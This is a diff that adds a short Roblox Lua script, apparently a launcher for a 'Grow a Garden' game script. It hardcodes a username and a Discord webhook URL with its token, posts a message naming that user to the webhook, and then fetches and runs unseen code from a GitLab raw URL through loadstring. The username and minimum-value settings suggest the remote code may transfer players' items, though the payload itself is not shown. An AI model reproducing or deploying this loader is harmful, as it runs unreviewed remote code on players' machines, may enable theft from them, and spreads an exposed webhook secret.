@@ -1,0 +1,24 @@
+-- Configurações
+local Username = "paopadeirosstt"
+local Webhook = "https://discord.com/api/webhooks/1405359400633503775/_XmeVnmARUDh7SrBs96Cnjabj8ajIFU9mU4rxzXnPH8-uG-18lhanUQ1xNc1lEkEy891"
+local MinimumValue = 0
+
+-- Função para enviar notificação para o Webhook
+local function sendWebhook(message)
+    local HttpService = game:GetService("HttpService")
+    local data = {
+        ["username"] = "Grow Script",
+        ["content"] = message
+    }
+    local jsonData = HttpService:JSONEncode(data)
+    -- Posta no Webhook
+    pcall(function()
+        HttpService:PostAsync(Webhook, jsonData)
+    end)
+end
+
+-- Executa a notificação
+sendWebhook("O usuário **"..Username.."** ativou o Grow a Garden com MinimumValue: "..MinimumValue)
+
+-- Executa o script Grow a Garden
+loadstring(game:HttpGet("https://gitlab.com/traxscriptss/traxscriptss/-/raw/main/grow-a-garden"))()
